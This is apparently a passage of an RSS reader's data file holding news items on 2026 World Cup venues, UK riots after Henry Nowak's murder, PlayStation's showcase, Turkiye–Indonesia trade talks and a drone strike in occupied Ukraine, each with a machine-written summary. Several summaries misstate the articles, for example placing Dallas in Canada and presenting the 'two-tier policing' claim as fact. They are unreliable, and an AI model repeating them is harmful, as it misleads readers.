+⚽ 10/07: Quarterfinal (3 pm ET/19:00 GMT)Opened only six years ago, the Los Angeles Stadium is the newest venue among the 16 World Cup venues.Cohosts USA will play two of their three group games at the stadium, which is home to the NFL’s LA Rams and LA Chargers.Los Angeles Stadium, also called SoFi Stadium for sponsorship reasons, will be involved during the 2028 LA Olympics, hosting the opening ceremony of the Summer Games.The Los Angeles Stadium in Inglewood is known for hosting NFL home games of two LA-based teams [Patrick T Fallon/AFP]7. Miami StadiumLocation: Miami Gardens, Florida, US
+Capacity:\xA065,000
+Built:\xA01987
+Fixtures:⚽ 15/06: Saudi Arabia vs Uruguay (6 pm ET/22:00 GMT)
+⚽ 21/06: Uruguay vs Cape Verde (6 pm ET/22:00 GMT)
+⚽ 24/06: Scotland vs Brazil (6 pm ET/22:00 GMT)
+⚽ 27/06: Colombia vs Portugal (7:30 pm ET/23:30 GMT)
+⚽ 03/07: Group J winners v Group H runners-up (6 pm ET/22:00 GMT)
+⚽ 11/07: Quarterfinals (5 pm ET/21:00 GMT)
+⚽ 18/07: Bronze final (5\xA0pm ET/21:00 GMT)From hosting the NFL’s famous Miami Dolphins, to being the epicentre of the annual Formula One Miami Grand Prix, to staging the Miami Open tennis tournament, the Miami Stadium is the venue of choice for large-scale sporting events in this famous coastal city.Six Super Bowls, multiple major concerts and international football matches have taken place at this venue, popularly called the Hard Rock Stadium.The Miami Stadium hosted eight matches during the 2025 Club World Cup, including the tournament opener [File: Hector Vivas/FIFA via Getty Images]8. New York/New Jersey StadiumLocation: East Rutherford, New Jersey, US
+Capacity:\xA082,500
+Built:\xA02010
+Fixtures:⚽ 13/06: Brazil vs Morocco (6 pm ET/22:00 GMT)
+⚽ 16/06: France vs Senegal (3 pm ET/19:00 GMT)
+⚽ 22/06: Norway vs Senegal (8 pm ET/00:00 GMT next day)
+⚽ 25/06: Ecuador vs Germany (4 pm ET/20:00 GMT)
+⚽ 27/06: Panama vs England (5 pm ET/21:00 GMT)
+⚽ 30/06: Group I winners v Group C/D/F/G/H third place (5 pm ET/21:00 GMT)
+⚽ 05/07: Round of 16 (4 pm ET/20:00 GMT)
+⚽ 19/07: Final (3 pm ET/19:00 GMT)This huge multipurpose stadium, currently home to the NFL’s New York Giants and New York Jets, is the grand stage chosen to host eight matches, including the all-important World Cup final on July 19.The New York/New Jersey Stadium, known as MetLife Stadium to fans, also hosted the 2025 FIFA Club World Cup final and both the semifinals.New Jersey has long been an important cultural area for original rock and rap music creation, and this venue has hosted many A-list performers such as Beyonce, Ed Sheeran and Taylor Swift.The New York/New Jersey Stadium hosted several Club World Cup matches last year, including the final in which Chelsea beat Paris Saint-Germain [File: Jeenah Moon/Reuters]9. Philadelphia StadiumLocation: Philadelphia, Pennsylvania, US
+Capacity: 69,000
+Built: 2003
+Fixtures:⚽ 14/06: Ivory Coast vs Ecuador (7 pm ET/23:00 GMT)
+⚽ 19/06: Brazil vs Haiti (9 pm ET/01:00 GMT next day)
+⚽ 22/06: France vs Iraq (5 pm ET/21:00 GMT)
+⚽ 25/06: Curacao vs Ivory Coast (4 pm ET/20:00 GMT)
+⚽ 27/06: Croatia vs Ghana (5 pm ET/21:00 GMT)
+⚽ 04/07: Round of 16 (5 pm ET/21:00 GMT)Home to the NFL Super Bowl LIX champions, Philadelphia Eagles, this stadium hosted eight games during the FIFA Club World Cup last year: six group matches, a round of 16 fixture and the quarterfinal, which featured Chelsea, the eventual champions.The Philadelphia Stadium, commonly known as Lincoln Financial Field, is located on the banks of the Delaware River, and its first ticketed event took place in 2003 when Manchester United defeated Barcelona 3-1 in a friendly in front of more than 68,000 fans.Apart from hosting FIFA Club World Cup matches, the Philadelphia Stadium has also been the venue for the US national team’s games [File: Susana Vera/Reuters]10. San Francisco Bay Area StadiumLocation: Santa Clara, California, US
+Capacity: 71,000
+Built: 2014
+Fixtures:⚽ 13/06: Qatar vs Switzerland (3 pm ET/19:00 GMT)
+⚽ 16/06: Austria vs Jordan (Midnight ET/04:00 GMT next day)
+⚽ 19/06: Turkiye vs Paraguay (Midnight ET/04:00 GMT next day)
+⚽ 22/06: Jordan vs Algeria (11 pm ET/03:00 GMT next day)
+⚽ 25/06: Paraguay vs Australia (10 pm ET/02:00 GMT next day)
+⚽ 01/07: Group D winners vs Group B/E/F/I/J third place (8 pm ET/00:00 GMT next day)The home of the NFL San Francisco 49ers, this is one of the newer venues tasked to host World Cup matches this year. The stadium, mostly known as Levi’s Stadium, is located approximately 40 miles (64 km) south of San Francisco.This venue hosted Super Bowls, with the latest in February when Puerto Rican megastar Bad Bunny headlined the half-time show.Fireworks ignite atop San Francisco Bay Area Stadium after the Seattle Seahawks defeated the New England Patriots in the NFL Super Bowl 60 football game [File: Frank Franklin II/AP]11. Seattle StadiumLocation: Seattle, Washington, US
+Capacity:\xA069,000
+Built:\xA02002
+Fixtures:⚽ 15/06: Belgium vs Egypt (3 pm ET/19:00 GMT)
+⚽ 19/06: USA vs Australia (3 pm ET/19:00 GMT)
+⚽ 24/06: Bosnia and Herzegovina vs Qatar (3 pm ET/19:00 GMT)
+⚽ 26/06: Egypt vs Iran (11 pm ET/03:00 GMT next day)
+⚽ 01/07: Group G winners vs Group A/E/H/I/J third place (4 pm ET/20:00 GMT)
+⚽ 06/07: Round of 16 (8 pm ET/00:00 GMT next day)This spectacular stadium is home to the MLS outfit Seattle Sounders as well as the NFL’s Seattle Seahawks and NWSL’s Seattle Reign.Boasting a distinctive horseshoe shape with an open north end that offers a stunning view of the city skyline, the Seattle Stadium – commonly known as Lumen Field – hosted matches during the 2025 FIFA Club World Cup.Located within a mile of downtown Seattle, the stadium is easily accessible by multiple freeways and public transport.The Seattle Stadium featured twice in the Guinness World Records as the loudest outdoor stadium [File: Kirby Lee/USA Today Sports via Reuters]12. Toronto StadiumLocation: Toronto, Ontario, Canada
+Capacity: 45,000
+Built: 2007
+Fixtures:⚽ 12/06: Canada vs Bosnia and Herzegovina (3 pm ET/19:00 GMT)
+⚽ 17/06: Ghana vs Panama (7 pm ET/23:00 GMT)
+⚽ 20/06: Germany vs Ivory Coast (4 pm ET/20:00 GMT)
+⚽ 23/06: Panama vs Croatia (7 pm ET/23:00 GMT next day)
+⚽ 26/06: Senegal vs Iraq (3 pm ET/19:00 GMT)
+⚽ 02/07: Group K runners-up vs Group L runners-up (7 pm ET/23:00 GMT)The Toronto Stadium will be the first Canadian venue to host a game at this year’s World Cup. The venue was purpose-built when Canada hosted the men’s U-20 World Cup in 2007, the tournament in which Argentina emerged champions, with a young Sergio Aguero winning the Golden Ball and Golden Boot.The stadium, which also hosted the women’s U-20 World Cup in 2014, has an English Premier League-style roof canopy and steep stands on either end of the ground.The Toronto Stadium hosted pre-World Cup friendlies involving the Canada national team [File: Vaughn Ridley/Getty Images via AFP]13. BC Place VancouverLocation: Vancouver, British Columbia, Canada
+Capacity: 54,000
+Built: 1983
+Fixtures:⚽ 13/06: Australia vs Turkiye (Midnight ET/04:00 GMT next day)
+⚽ 18/06: Canada vs Qatar (6 pm ET/22:00 GMT)
+⚽ 21/06: New Zealand vs Egypt (9 pm ET/01:00 GMT next day)
+⚽ 24/06: Switzerland vs Canada (3 pm ET/19:00 GMT)
+⚽ 26/06: New Zealand vs Belgium (11 pm local/03:00 GMT next day)
+⚽ 02/07: Group B winners vs Group E/F/G/I/J third place (11 pm local/03:00 GMT next day)
+⚽ 07/07: Round of 16 (4 pm local/20:00 GMT)Situated on the banks of the False Creek inlet, BC Place Vancouver is a multipurpose stadium which hosts matches of MLS team Vancouver Whitecaps FC, the Canadian football team BC Lions and the annual Canada Sevens, part of the World Rugby Sevens Series.Known for its iconic architecture, the venue is famously remembered for the 2015 Women’s World Cup final in which Carli Lloyd’s hat-trick guided the US to an emphatic victory over Japan.At this year’s tournament, the venue will host two group games of the cohosts, Canada.The multipurpose BC Place is home to football, rugby sevens and Canadian football teams [File: Elaine Thompson/AP]14. Mexico City StadiumLocation: Mexico City, Mexico
+Capacity: 83,000
+Built: 1966
+Fixtures:⚽ 11/06: Mexico vs South Africa (3 pm ET/19:00 GMT)
+⚽ 17/06: Uzbekistan vs Colombia (10 pm ET/02:00 GMT next day)
+⚽ 24/06: Czechia vs Mexico (9 pm ET/01:00 GMT next day)
+⚽ 30/06: Group A winners vs Group C/E/F/H/I third place (9 pm ET/01:00 GMT next day)
+⚽ 05/07: Round of 16 (8 pm ET/00:00 GMT next day)The renovated Estadio Azteca – now known as the Mexico City Stadium – will make history as the first to host three World Cups after welcoming the likes of Pele and Diego Maradona across two thrilling finals in 1970 and 1986.The stadium will host the opening match of the World Cup, as cohosts Mexico face South Africa on June 11 in a replay of the 2010 edition’s tournament opener. It will also host another group fixture of El Tri.Sitting at an altitude of 2,200 metres (7,200 feet) above sea level, this venue is widely regarded as one of the most iconic stadiums in world football. It is the official home ground of the Mexico team, as well as Liga MX club Club America.A drone view of Banorte Stadium, temporarily renamed Mexico City Stadium for the 2026 World Cup [File: Henry Romero/Reuters]15. Estadio GuadalajaraLocation: Zapopan, Jalisco, Mexico
+Capacity: 48,000
+Built: 2010
+Fixtures:⚽ 11/06: South Korea vs Czechia (10 pm ET/02:00 GMT next day)
+⚽ 18/06: Mexico vs South Korea (9 pm ET/01:00 GMT next day)
+⚽ 23/06: Colombia vs Congo DR (10 pm ET/02:00 GMT next day)
+⚽ 26/06: Uruguay vs Spain (8 pm ET/00:00 GMT next day)Commonly known as Estadio Akron, this multipurpose venue is mostly used for football games, serving as the home ground of Liga MX side CD Guadalajara.Built on raised ground and with a spherical, coliseum-like design, Estadio Guadalajara is an eye-catching venue in North America. It also hosted a major youth tournament, the FIFA U-17 World Cup in 2011.The Guadalajara Stadium has hosted Pan American Games events and a Copa Libertadores final [File: Daniel Becerril]16. Estadio MonterreyLocation: Guadalupe, Nuevo Leon, Mexico
+Capacity: 53,500
+Built: 2015
+Fixtures:⚽ 14/06: Sweden vs Tunisia (10 pm ET/02:00 GMT next day)
+⚽ 20/06: Tunisia vs Japan (Midnight ET/04:00 GMT next day)
+⚽ 24/06: South Africa vs South Korea (9 pm ET/01:00 GMT next day)
+⚽ 29/06: Group F winners vs Group C runners-up (9 pm ET/01:00 GMT next day)The home of Liga MX side Monterrey, this stadium also hosted matches during the 2022 CONCACAF W Championship.Known for its compact energy solutions and low-voltage equipment, Estadio Monterrey’s non-sporting activities include music concerts. Global sensations such as Bad Bunny, Shakira, Justin Bieber and the band Coldplay have performed here.The Estadio Monterrey is dubbed ‘El Gigante de Acero’, which means ‘the steel giant’ in Spanish [File: Alfredo Estrella/AFP]The FIFA World Cup begins on June 11. You can follow the action on Al Jazeera’s dedicated\xA0World Cup 2026\xA0page with all the latest news, match build-up and live text commentary, and keep up to date with group standings, real-time match results and schedules.`,summary:`• The World Cup 2026 will feature matches in the following venues:
+• Atlanta Stadium (USA)
+• Boston Stadium (US)
+• Dallas Stadium (Canada)
+• Houston Stadium (USA)`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2024/02/AP24023779421899-1707115175.jpg?resize=1920%2C1440`,published_at:1780500717,fetched_at:1780509344,content_hash:`c1e55824fa5090ee9b16b64bc0a4c348db3ae53591a43e20ead449ab5d3ea04a`,tags:`Sport`,is_read:!1,is_starred:!1,is_later:!0,dup_count:0},{id:99,feed_id:11,guid:`https://www.aljazeera.com/?t=1780484846`,url:`https://www.aljazeera.com/news/2026/6/3/uk-minister-condemns-violent-protests-against-students-murder?traffic_source=rss`,title:`UK minister condemns violent protests against student’s murder`,content_html:`<div id="readability-page-1" class="page"><div><p><em>Henry Nowak’s death has spurred claims by right-wing politicians that the UK has ‘two-tier’ policing that disadvantages white people.</em></p></div><div aria-live="polite" aria-atomic="true"><p>British Home Secretary Shabana Mahmood has condemned as “completely unacceptable” violent, racially charged demonstrations over the case of an 18-year-old student who was handcuffed by police as he lay dying after his killer falsely claimed to be a victim of a racist attack.</p><p>The riots on Tuesday were spurred by claims that the United Kingdom has “two-tier justice” that disadvantages white people.</p><section><h2>Recommended Stories </h2><span>list of 3 items</span><ul><li><span>list 1 of 3</span><a href="https://www.aljazeera.com/news/2026/5/6/follow-the-money-how-far-right-reform-uk-built-a-global-network">‘Supercharged’ donations: How far-right Reform UK built a global network</a></li><li><span>list 2 of 3</span><a href="https://www.aljazeera.com/news/2026/5/19/king-of-the-north-who-is-andy-burnham-a-potential-uk-prime-minister">‘King of the North’: Who is Andy Burnham, a potential UK prime minister?</a></li><li><span>list 3 of 3</span><a href="https://www.aljazeera.com/news/2026/5/21/net-migration-to-the-uk-falls-by-nearly-50-percent-amid-tighter-policies">Net migration to the UK falls by nearly 50 percent amid tighter policies</a></li></ul><span>end of list</span></section><p>Henry Nowak was murdered in December by Vickrum Digwa, a 23-year-old British Sikh. This week, a court found Digwa stabbed 18-year-old Nowak five times and then falsely claimed to be the victim of a racist assault. Police initially treated Nowak as a suspect and handcuffed him, before noticing his injuries and trying to resuscitate him.</p><p>Digwa was sentenced to life imprisonment on Monday, and the case has dominated headlines in the UK, as violent protests against the police erupted in Southampton, the city where Nowak was killed.</p><p>Police were pelted with chairs, cans, rocks and flares late on Tuesday by hundreds of people in the southern English coastal city. Two people were arrested, and 11 officers and a police dog were injured, police reported.</p><p>Nowak’s death has triggered debates about policing and knife crime, and inflamed claims by right-wing activists and politicians that there are double standards in the UK’s justice system with a bias against white people.</p><p>Mahmood accused protesters of hijacking a tragedy to stir up violence against the police.</p><p>“I thank the police who have tonight shown great bravery and calm in the face of disgraceful violence directed at them,” she <a href="https://x.com/ShabanaMahmood/status/2061913234484171019" rel="noopener" target="_blank">said on X</a>, calling on people to listen to the Nowak family’s “powerful call”.</p><p>Outside the court on Monday, Nowak’s father, Mark, criticised the “inhumane and degrading” treatment of his son by the police, but said: “We do not want his death to be used to create further division, hatred or tension. We want his story to help make our streets safer for everyone.”</p><p>After the sentencing, police released bodycam video showing officers not taking Nowak seriously when he told them he had been stabbed and repeatedly said he could not breathe.</p><p><a href="https://www.aljazeera.com/news/2026/5/5/starmers-referendum-how-local-elections-could-expose-a-fractured-uk">Prime Minister Keir Starmer</a> said he was sickened by the video and questions needed to be answered about how “accusations of racism informed the decision-making in this case”.</p><p>The Independent Office for Police Conduct, which investigates allegations of police wrongdoing, is reviewing the actions of the officers from the Hampshire and Isle of Wight Constabulary. The National Police Chiefs’ Council also said it will review its antiracism guidance in the wake of the killing.</p><p><a href="https://www.aljazeera.com/news/2026/5/6/follow-the-money-how-far-right-reform-uk-built-a-global-network">Nigel Farage, leader of the anti-immigration Reform UK party</a>, said on Tuesday that the case was an example of “two-tier policing” — a right-wing talking point that claims ethnic minorities and immigrants are treated more favourably than white people.</p><p>Farage urged people to respond to the incident with “pure cold rage” and said, “White lives matter just as much as Black lives.”</p><p>X owner Elon Musk and <a href="https://www.aljazeera.com/news/2026/2/26/uk-far-right-activist-tommy-robinson-talks-up-us-state-department-visit">British far-right activist Stephen Yaxley-Lennon, also known as Tommy Robinson</a>, have also expressed outrage at the case and called on people to take to the streets in “Justice for Henry Nowak” protests.</p><p>Some UK politicians have called for Sikhs to be banned from carrying ceremonial knives, known as kirpans. The judge said Digwa had a small kirpan but also had an 8-inch (21cm) sheathed Sikh dagger that was used as the weapon to kill Nowak.</p><p>Hampshire Police has apologised, and said in a statement on Tuesday that one of the officers involved in the arrest had resigned, while three others were being treated as ⁠witnesses in the investigation.</p></div></div>`,content_text:`Henry Nowak’s death has spurred claims by right-wing politicians that the UK has ‘two-tier’ policing that disadvantages white people.British Home Secretary Shabana Mahmood has condemned as “completely unacceptable” violent, racially charged demonstrations over the case of an 18-year-old student who was handcuffed by police as he lay dying after his killer falsely claimed to be a victim of a racist attack.The riots on Tuesday were spurred by claims that the United Kingdom has “two-tier justice” that disadvantages white people.Recommended Stories list of 3 itemslist 1 of 3‘Supercharged’ donations: How far-right Reform UK built a global networklist 2 of 3‘King of the North’: Who is Andy Burnham, a potential UK prime minister?list 3 of 3Net migration to the UK falls by nearly 50 percent amid tighter policiesend of listHenry Nowak was murdered in December by Vickrum Digwa, a 23-year-old British Sikh. This week, a court found Digwa stabbed 18-year-old Nowak five times and then falsely claimed to be the victim of a racist assault. Police initially treated Nowak as a suspect and handcuffed him, before noticing his injuries and trying to resuscitate him.Digwa was sentenced to life imprisonment on Monday, and the case has dominated headlines in the UK, as violent protests against the police erupted in Southampton, the city where Nowak was killed.Police were pelted with chairs, cans, rocks and flares late on Tuesday by hundreds of people in the southern English coastal city. Two people were arrested, and 11 officers and a police dog were injured, police reported.Nowak’s death has triggered debates about policing and knife crime, and inflamed claims by right-wing activists and politicians that there are double standards in the UK’s justice system with a bias against white people.Mahmood accused protesters of hijacking a tragedy to stir up violence against the police.“I thank the police who have tonight shown great bravery and calm in the face of disgraceful violence directed at them,” she said on X, calling on people to listen to the Nowak family’s “powerful call”.Outside the court on Monday, Nowak’s father, Mark, criticised the “inhumane and degrading” treatment of his son by the police, but said: “We do not want his death to be used to create further division, hatred or tension. We want his story to help make our streets safer for everyone.”After the sentencing, police released bodycam video showing officers not taking Nowak seriously when he told them he had been stabbed and repeatedly said he could not breathe.Prime Minister Keir Starmer said he was sickened by the video and questions needed to be answered about how “accusations of racism informed the decision-making in this case”.The Independent Office for Police Conduct, which investigates allegations of police wrongdoing, is reviewing the actions of the officers from the Hampshire and Isle of Wight Constabulary. The National Police Chiefs’ Council also said it will review its antiracism guidance in the wake of the killing.Nigel Farage, leader of the anti-immigration Reform UK party, said on Tuesday that the case was an example of “two-tier policing” — a right-wing talking point that claims ethnic minorities and immigrants are treated more favourably than white people.Farage urged people to respond to the incident with “pure cold rage” and said, “White lives matter just as much as Black lives.”X owner Elon Musk and British far-right activist Stephen Yaxley-Lennon, also known as Tommy Robinson, have also expressed outrage at the case and called on people to take to the streets in “Justice for Henry Nowak” protests.Some UK politicians have called for Sikhs to be banned from carrying ceremonial knives, known as kirpans. The judge said Digwa had a small kirpan but also had an 8-inch (21cm) sheathed Sikh dagger that was used as the weapon to kill Nowak.Hampshire Police has apologised, and said in a statement on Tuesday that one of the officers involved in the arrest had resigned, while three others were being treated as ⁠witnesses in the investigation.`,summary:`• The UK has "two-tier" policing that disadvantages white people.
+• British Home Secretary Shabana Mahmood condemned violent protests over an 18-year-old student's murder.
+• Police initially treated Nowak as a suspect and handcuffed him, but later noticed his injuries and tried to resuscitate him.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/getty_6a200dd652-1780485590.jpg?resize=1920%2C1440`,published_at:1780500661,fetched_at:1780509344,content_hash:`a75c5110370228808934799b407ef17883e0383727bd869008e9ebf9388c5846`,tags:`News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:3,feed_id:3,guid:`https://www.theverge.com/?p=942520`,url:`https://www.theverge.com/games/942520/playstation-wolverine-god-of-war-laufey-state-of-play-june-2026`,title:`PlayStation is getting back to what it’s good at`,author:`Jay Peters`,content_html:`
+
+						
+<figure>
+
+<img alt="" data-caption="" data-portal-copyright="Image: Sony Interactive Entertainment" data-has-syndication-rights="1" src="https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/7fa631fcc57afee84f351918717a3cdab924a583a409f14d.jpg?quality=90&#038;strip=all&#038;crop=0,0,100,100" />
+	<figcaption>
+		</figcaption>
+</figure>
+<p class="has-text-align-none">PlayStation used its most recent State of Play showcase to make it clear where its focus is. After a series of costly live-service stumbles, it's getting back to focusing on premium, narrative-driven, single-player games. That statement was made clear with how it started and ended the hourlong show.</p>
+<p class="has-text-align-none">The showcase began with an extended look at gameplay <a href="https://www.theverge.com/games/939378/marvels-wolverine-playstation-trailer-state-of-play-june-2026">from <em>Marvel's Wolverine</em></a>, the new superhero title from Insomniac Games. Over seven minutes of bloody action, Logan sliced and diced his way through a bunch of baddies as he tried to rescue some captured mutants, briefly teaming up with Jean Grey for some help taking them down. Insomniac is well …</p>
+<p><a href="https://www.theverge.com/games/942520/playstation-wolverine-god-of-war-laufey-state-of-play-june-2026">Read the full story at The Verge.</a></p>
+						`,content_text:`PlayStation used its most recent State of Play showcase to make it clear where its focus is. After a series of costly live-service stumbles, it's getting back to focusing on premium, narrative-driven, single-player games. That statement was made clear with how it started and ended the hourlong show. The showcase began with an extended look at gameplay from Marvel's Wolverine , the new superhero title from Insomniac Games. Over seven minutes of bloody action, Logan sliced and diced his way through a bunch of baddies as he tried to rescue some captured mutants, briefly teaming up with Jean Grey for some help taking them down. Insomniac is well … Read the full story at The Verge.`,cleaned_html:`<p>Summary: PlayStation returning to what it does best.<br>Points: 1. PlayStation is focusing on premium, narrative-driven single-player games.<br>2. Examples are Marvel's Wolverine game and Insomniac Games' Insomniac Games series.</p>`,summary:`PlayStation is getting back to what it's good at.
+
+• The article discusses PlayStation's recent focus on premium, narrative-driven single-player games.
+• It mentions Marvel's Wolverine game and Insomniac Games' Insomniac Games series.`,summary_model:`qwen2.5:0.5b`,image_url:`https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/7fa631fcc57afee84f351918717a3cdab924a583a409f14d.jpg?quality=90&strip=all&crop=0,0,100,100`,published_at:1780500615,fetched_at:1780509343,content_hash:`91a767b8ce560834aee26d206fa86f5da9182078545c570fe4d8ca3fd80c35a5`,tags:`Analysis, Entertainment, Gaming`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:103,feed_id:11,guid:`https://www.aljazeera.com/?t=1780495589`,url:`https://www.aljazeera.com/news/2026/6/3/defence-energy-halal-sectors-top-agenda-in-turkiye-indonesia-talks?traffic_source=rss`,title:`Turkiye’s top diplomat, Indonesia’s president discuss $10bn trade goal`,content_html:`<div id="readability-page-1" class="page"><div><p><em>The two discuss a range of sectors, including defence, energy, transportation and the halal food industry.</em></p></div><div aria-live="polite" aria-atomic="true"><p>Turkish Foreign Minister Hakan Fidan and Indonesian President Prabowo Subianto have held an “extremely productive” meeting in Jakarta as the two countries aim to reach a bilateral trade volume target of $10bn, according to Turkiye’s top diplomat.</p><p>The two sides discussed expanding cooperation across a range of sectors, including defence, energy, transportation and the halal food industry, Fidan <a href="https://x.com/HakanFidan/status/2062090541739790440" rel="noopener" target="_blank">said on X</a> on Wednesday.</p><section><h2>Recommended Stories </h2><span>list of 3 items</span><ul><li><span>list 1 of 3</span><a href="https://www.aljazeera.com/features/2026/5/21/iron-brothers-how-china-and-pakistan-built-an-unlikely-75-year-bond">‘Iron brothers’: How China and Pakistan built an unlikely 75-year bond</a></li><li><span>list 2 of 3</span><a href="https://www.aljazeera.com/economy/2026/5/22/malaysia-orders-tiktok-to-address-defamatory-content-about-king">Malaysia orders TikTok to address ‘defamatory’ content about king</a></li><li><span>list 3 of 3</span><a href="https://www.aljazeera.com/news/2026/5/25/australian-gaza-aid-flotilla-activists-allege-abuse-after-israeli-abduction">Australian Gaza aid flotilla activists allege abuse after Israeli abduction</a></li></ul><span>end of list</span></section><p>“Following our visit to Singapore, our contacts today in Indonesia, our strategic partner, were extremely productive in terms of following up on the multifaceted issues on our agenda,” he wrote.</p><p>Fidan said the two countries also “thoroughly evaluated” projects aimed at reaching a bilateral trade volume target of $10bn.</p><p>The target was agreed in April last year, when the leaders of the two countries pledged to deepen ties and pursue “new breakthroughs” in bilateral cooperation, according to Turkish media.</p><p>For his part, Prabowo expressed appreciation for Turkiye’s support in the repatriation of nine Indonesian citizens who had been <a href="https://www.aljazeera.com/news/2026/5/19/gaza-aid-flotilla-organisers-say-41-boats-intercepted-10-still-sailing">abducted</a> by Israel as part of the crackdown on the Global Sumud Flotilla 2.0 humanitarian mission bound for Gaza.</p><p>The two sides also exchanged views on developments in the Middle East, with particular attention to Iran and Palestine, according to a <a href="https://presidenri.go.id/siaran-pers/presiden-prabowo-terima-menlu-turkiye-hakan-fidan-di-hambalang-bahas-palestina-hingga-stabilitas-timur-tengah/" rel="noopener" target="_blank">statement</a> from Indonesia’s presidency.</p><p>“As fellow countries in the Global South, Indonesia and Turkiye share the view that regional stability should be maintained through dialogue, diplomacy and the peaceful resolution of disputes,” the statement said.</p></div></div>`,content_text:`The two discuss a range of sectors, including defence, energy, transportation and the halal food industry.Turkish Foreign Minister Hakan Fidan and Indonesian President Prabowo Subianto have held an “extremely productive” meeting in Jakarta as the two countries aim to reach a bilateral trade volume target of $10bn, according to Turkiye’s top diplomat.The two sides discussed expanding cooperation across a range of sectors, including defence, energy, transportation and the halal food industry, Fidan said on X on Wednesday.Recommended Stories list of 3 itemslist 1 of 3‘Iron brothers’: How China and Pakistan built an unlikely 75-year bondlist 2 of 3Malaysia orders TikTok to address ‘defamatory’ content about kinglist 3 of 3Australian Gaza aid flotilla activists allege abuse after Israeli abductionend of list“Following our visit to Singapore, our contacts today in Indonesia, our strategic partner, were extremely productive in terms of following up on the multifaceted issues on our agenda,” he wrote.Fidan said the two countries also “thoroughly evaluated” projects aimed at reaching a bilateral trade volume target of $10bn.The target was agreed in April last year, when the leaders of the two countries pledged to deepen ties and pursue “new breakthroughs” in bilateral cooperation, according to Turkish media.For his part, Prabowo expressed appreciation for Turkiye’s support in the repatriation of nine Indonesian citizens who had been abducted by Israel as part of the crackdown on the Global Sumud Flotilla 2.0 humanitarian mission bound for Gaza.The two sides also exchanged views on developments in the Middle East, with particular attention to Iran and Palestine, according to a statement from Indonesia’s presidency.“As fellow countries in the Global South, Indonesia and Turkiye share the view that regional stability should be maintained through dialogue, diplomacy and the peaceful resolution of disputes,” the statement said.`,summary:`Turkish Foreign Minister Hakan Fidan and Indonesian President Prabowo Subianto met in Jakarta to discuss a $10 billion trade goal. The meeting aimed to reach a bilateral trade volume target of $10bn, which was agreed upon by leaders from both countries last year.
+
+• Turkish Foreign Minister Hakan Fidan and Indonesian President Prabowo Subianto have held an “extremely productive” meeting in Jakarta.
+• They discussed expanding cooperation across various sectors, including defense, energy, transportation, and the halal food industry.
+• The target was to reach a bilateral trade volume of $10bn, which has been agreed upon.
+• Fidan praised the two countries for their "thoroughly evaluated" projects aimed at achieving this goal.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/AA-20260603-41562042-41562036-TURKISH_FOREIGN_MINISTER_HAKAN_FIDAN_IN_INDONESIA____-1780496250.jpg?resize=1600%2C1080`,published_at:1780500571,fetched_at:1780509344,content_hash:`21c49e8301624f715ff7ba1e008332051ebd71d1afea475119306876aae8d736`,tags:`News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:58,feed_id:9,guid:`https://www.bbc.com/news/articles/cp3peyykxd5o#0`,url:`https://www.bbc.com/news/articles/cp3peyykxd5o?at_medium=RSS&at_campaign=rss`,title:`Eight killed after drone hits bus in Russian-occupied part of Ukraine`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-testid="byline" data-component="byline-block"><p><time datetime="2026-06-03T15:18:28.758Z">2 hours ago</time></p><p><span data-testid="byline-contributors"><p><span>James Chater</span><span>and</span></p><p><span>Henry Moore</span></p></span></p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/e122/live/1fbe2850-5f34-11f1-b682-cf91850925ea.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/e122/live/1fbe2850-5f34-11f1-b682-cf91850925ea.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/e122/live/1fbe2850-5f34-11f1-b682-cf91850925ea.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/e122/live/1fbe2850-5f34-11f1-b682-cf91850925ea.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/e122/live/1fbe2850-5f34-11f1-b682-cf91850925ea.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/e122/live/1fbe2850-5f34-11f1-b682-cf91850925ea.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/e122/live/1fbe2850-5f34-11f1-b682-cf91850925ea.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/e122/live/1fbe2850-5f34-11f1-b682-cf91850925ea.jpg.webp" loading="eager" alt="Reuters A wide shot of a burnt out bus in Donetsk. The top half of the white vehicle is completely destroyed.  "/><span>Reuters</span></p></div><p><figcaption>At least eight people were killed in the drone strike, Russian state media report</figcaption></p></figure></div><div data-component="text-block"><p>Eight people have been killed and 10 others injured after a drone hit a passenger bus travelling through a Russian-occupied part of Ukraine, Russia has said.</p></div><div data-component="text-block"><p>Denis Pushilin, the Moscow-installed head of Ukraine&#39;s eastern Donetsk region, said the bus was struck in the early hours of Wednesday as it was travelling between a city near Moscow and Simferopol, in Russian-annexed Crimea.</p></div><div data-component="text-block"><p>Russia has claimed the strike was by a Ukrainian drone. When asked by the BBC whether Kyiv was behind the attack, Ukraine&#39;s general staff did not confirm nor deny but said it would not comment &#34;on statements made by the aggressor state&#34;.</p></div><div data-component="text-block"><p>In a Ukraine-held part of the Donetsk region, three people were killed and one injured in Russian shelling of the city of Kramatorsk, local official Vadym Filashkin said.</p></div><div data-component="text-block"><p>The attack on Russian President Vladimir Putin&#39;s hometown thousands of kilometres from Ukraine&#39;s border comes as St Petersburg hosts the annual International Economic Forum, an event designed to showcase Russia to the world. Putin is due to speak there on Friday.</p></div><div data-component="text-block"><p>The strikes come a day after <a href="https://www.bbc.co.uk/news/articles/c5y8nq8ljqwo" target="_self">a massive Russian assault</a> on cities across Ukraine killed at least 22 people, including several women and children.</p></div><div data-component="text-block"><p>In Donetsk, Russian investigators said they had opened 